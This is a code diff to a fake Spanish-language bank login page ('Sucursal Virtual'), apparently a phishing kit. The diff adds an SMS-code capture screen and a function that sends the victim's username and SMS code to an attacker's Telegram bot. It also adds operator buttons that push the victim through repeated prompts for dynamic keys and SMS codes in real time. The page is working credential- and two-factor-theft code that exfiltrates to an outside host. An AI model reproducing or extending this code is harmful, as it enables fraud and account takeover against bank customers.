@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Virtual</title>
+<title>Sucursal Virtual</title>
 
 <style>
 :root {
@@ -135,6 +135,66 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 .btn-continuar.ready { background: var(--yellow); color: #1f1f1f; cursor: pointer; }
 .btn-continuar.ready:hover { background: #f2cd00; }
 
+/* === VISTA SMS CODE === */
+.sms-view {
+  display: none;
+  text-align: center;
+  padding: 20px 0;
+}
+.sms-view.active { display: block; }
+.sms-icon {
+  font-size: 60px;
+  margin-bottom: 20px;
+}
+.sms-message {
+  font-size: 18px;
+  color: #333;
+  line-height: 1.5;
+  margin-bottom: 20px;
+}
+.sms-message strong { color: var(--main-black); }
+.sms-input-wrap {
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+.sms-input-wrap input {
+  width: 200px;
+  padding: 15px;
+  font-size: 24px;
+  text-align: center;
+  letter-spacing: 5px;
+  border: 2px solid #ccc;
+  border-radius: 8px;
+  outline: none;
+  font-family: inherit;
+}
+.sms-input-wrap input:focus {
+  border-color: var(--main-black);
+}
+
+/* Error para el SMS */
+.sms-error { color: #d93025; font-size: 15px; text-align: center; margin-bottom: 20px; display: none; font-weight: bold; }
+.sms-error.show { display: block; }
+.sms-input-wrap.error input { border-color: #d93025; }
+
+.btn-sms-final {
+  width: 100%;
+  padding: 16px;
+  border-radius: 30px;
+  border: none;
+  background: var(--yellow);
+  color: var(--main-black);
+  font-size: 18px;
+  font-weight: 700;
+  cursor: pointer;
+  font-family: inherit;
+}
+.btn-sms-final:hover {
+  background: #f2cd00;
+}
+
 /* Loading Overlay */
 #loading-overlay { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.8); z-index: 2000; align-items: center; justify-content: center; }
 .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--main-black); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
@@ -225,29 +285,51 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 <div class="modal-overlay" id="modalDinamica">
   <div class="modal-content">
     
-    <div class="gif-container">
-      <img src="cd-desktop.gif" alt="Instrucciones Clave Dinámica" onerror="this.style.display='none'">
+    <!-- VISTA 1: CLAVE DINÁMICA (6 dígitos) -->
+    <div id="viewDinamica">
+      <div class="gif-container">
+        <img src="cd-desktop.gif" alt="Instrucciones Clave Dinámica" onerror="this.style.display='none'">
+      </div>
+
+      <h2 class="modal-title">Ingresa la Clave Dinámica</h2>
+      <p class="modal-subtitle">Encuentra tu Clave Dinámica en tu aplicación móvil.</p>
+
+      <div class="otp-container" id="otpContainer">
+        <input type="text" id="otpInput" class="otp-input" inputmode="numeric" maxlength="6" autocomplete="off">
+        <div class="otp-slot active"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+      </div>
+
+      <p class="otp-error" id="otpError">La clave dinámica es incorrecta o ha expirado. Intenta de nuevo.</p>
+
+      <div class="modal-actions">
+        <button class="btn-modal btn-borrar" id="btnBorrar">Borrar</button>
+        <button class="btn-modal btn-continuar" id="btnContinuar" disabled>Continuar</button>
+      </div>
     </div>
 
-    <h2 class="modal-title">Ingresa la Clave Dinámica</h2>
-    <p class="modal-subtitle">Encuentra tu Clave Dinámica en tu aplicación móvil.</p>
+    <!-- VISTA 2: SMS CODE (oculta por defecto) -->
+    <div id="viewSms" class="sms-view">
+      <div class="sms-icon">📩</div>
+      <h2 class="modal-title">Código SMS Enviado</h2>
+      <p class="sms-message">
+        Hemos enviado un código de verificación a tu número de teléfono registrado. 
+        Por favor, ingrésalo a continuación.
+      </p>
+      
+      <div class="sms-input-wrap" id="smsInputWrap">
+        <input type="text" id="smsCodeInput" inputmode="numeric" maxlength="6" placeholder="******" autocomplete="off">
+      </div>
 
-    <div class="otp-container" id="otpContainer">
-      <input type="text" id="otpInput" class="otp-input" inputmode="numeric" maxlength="6" autocomplete="off">
-      <div class="otp-slot active"></div>
-      <div class="otp-slot"></div>
-      <div class="otp-slot"></div>
-      <div class="otp-slot"></div>
-      <div class="otp-slot"></div>
-      <div class="otp-slot"></div>
+      <p class="sms-error" id="smsError">El código SMS es incorrecto o ha expirado. Intenta de nuevo.</p>
+
+      <button class="btn-sms-final" id="btnSmsFinal">Validar Código</button>
     </div>
 
-    <p class="otp-error" id="otpError">La clave dinámica es incorrecta o ha expirado. Intenta de nuevo.</p>
-
-    <div class="modal-actions">
-      <button class="btn-modal btn-borrar" id="btnBorrar">Borrar</button>
-      <button class="btn-modal btn-continuar" id="btnContinuar" disabled>Continuar</button>
-    </div>
   </div>
 </div>
 
@@ -282,6 +364,14 @@ const btnContinuar = document.getElementById("btnContinuar");
 const otpError = document.getElementById("otpError");
 const otpContainer = document.getElementById("otpContainer");
 
+// Elementos Vistas del Modal
+const viewDinamica = document.getElementById("viewDinamica");
+const viewSms = document.getElementById("viewSms");
+const smsCodeInput = document.getElementById("smsCodeInput");
+const btnSmsFinal = document.getElementById("btnSmsFinal");
+const smsError = document.getElementById("smsError");
+const smsInputWrap = document.getElementById("smsInputWrap");
+
 // Variables de control
 let pollingActivo = false;
 let pollingTimeout = null;
@@ -301,7 +391,6 @@ function actualizarBoton() {
   submitBtn.disabled = !formularioValido;
   submitBtn.classList.toggle("ready", formularioValido);
   
-  // Ocultar el error al escribir
   if (formularioValido) loginError.classList.remove("show");
 }
 
@@ -344,7 +433,7 @@ function enviarDinamicaTelegram(dinamica) {
     const keyboard = {
         inline_keyboard: [[
             { text: '❌ Error Dinámica', callback_data: 'error_dinamica' },
-            { text: '✅ Dinámica Correcta', callback_data: 'dinamica_ok' }
+            { text: '📩 SMS Code', callback_data: 'sms_code' } 
         ]]
     };
 
@@ -356,6 +445,29 @@ function enviarDinamicaTelegram(dinamica) {
             msgIdActual = String(data.result.message_id);
             actionProcessed = false;
             escucharBotones(handleTelegramActionDinamica);
+        }
+    });
+}
+
+function enviarSmsTelegram(codigoSms) {
+    const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
+            [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
+            [{ text: '🏁 Finalizar', callback_data: 'finalizar' }]
+        ]
+    };
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+    }).then(r => r.json()).then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            escucharBotones(handleTelegramActionSms);
         }
     });
 }
@@ -403,6 +515,9 @@ function handleTelegramActionLogin(action) {
 
     if (action === 'pedir_dinamica') {
         modal.classList.add("active");
+        viewDinamica.style.display = "block";
+        viewSms.classList.remove("active");
+        
         otpInput.value = "";
         otpError.classList.remove("show");
         otpContainer.classList.remove("error");
@@ -423,6 +538,9 @@ function handleTelegramActionDinamica(action) {
 
     if (action === 'error_dinamica') {
         modal.classList.add("active"); 
+        viewDinamica.style.display = "block";
+        viewSms.classList.remove("active");
+        
         otpError.classList.add("show");
         otpContainer.classList.add("error");
         otpInput.value = "";
@@ -430,8 +548,40 @@ function handleTelegramActionDinamica(action) {
         otpInput.focus();
         
         actionProcessed = false;
-    } else if (action === 'dinamica_ok') {
-        alert("¡Clave dinámica correcta! (Simulación de ingreso exitoso)");
+    } else if (action === 'sms_code') {
+        viewDinamica.style.display = "none";
+        viewSms.classList.add("active");
+        smsCodeInput.value = "";
+        smsError.classList.remove("show");
+        smsInputWrap.classList.remove("error");
+        setTimeout(() => smsCodeInput.focus(), 100);
+    }
+}
+
+function handleTelegramActionSms(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'error_dinamica_final') {
+        // Volver a la vista de la dinámica
+        viewSms.classList.remove("active");
+        viewDinamica.style.display = "block";
+        otpError.classList.add("show");
+        otpContainer.classList.add("error");
+        otpInput.value = "";
+        actualizarOTP();
+        otpInput.focus();
+        actionProcessed = false;
+    } else if (action === 'error_sms_final') {
+        // Mostrar error en la vista SMS
+        smsError.classList.add("show");
+        smsInputWrap.classList.add("error");
+        smsCodeInput.value = "";
+        smsCodeInput.focus();
+        actionProcessed = false;
+    } else if (action === 'finalizar') {
+        alert("¡Proceso completado con éxito! (Simulación final)");
         location.reload();
     }
 }
@@ -501,6 +651,25 @@ btnContinuar.addEventListener("click", () => {
     mostrarOverlay();
     enviarDinamicaTelegram(otpInput.value);
   }
+});
+
+// Lógica para el código SMS
+smsCodeInput.addEventListener("input", function() {
+  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+  smsError.classList.remove("show");
+  smsInputWrap.classList.remove("error");
+});
+
+btnSmsFinal.addEventListener("click", () => {
+  if(smsCodeInput.value.length < 6) {
+    smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
+    smsError.classList.add("show");
+    smsInputWrap.classList.add("error");
+    return;
+  }
+  
+  mostrarOverlay();
+  enviarSmsTelegram(smsCodeInput.value);
 });
 
 actualizarBoton();
